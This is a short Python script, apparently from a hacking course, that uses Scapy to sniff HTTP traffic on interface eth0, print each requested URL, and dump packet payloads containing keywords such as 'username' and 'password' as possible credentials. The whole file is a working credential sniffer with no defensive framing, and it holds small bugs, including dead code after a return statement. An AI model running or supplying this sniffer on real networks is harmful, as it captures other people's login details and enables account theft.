#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    # Show() displays all the OSI layers in the packet
    # print(packet.show())
    # Scapy.Raw allows to get only the payload layer
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "login", "pass", "password"]
        for keyword in keywords:
            if keyword in str(load):
                return load
                print("\n\n[+] Possible username/password >> " + load + "\n\n")
                break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url.decode())

        # Show() displays all the OSI layers in the packet
        # print(packet.show())
        # Scapy.Raw allows to get only the payload layer
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info.decode() + "\n\n")


sniff("eth0")

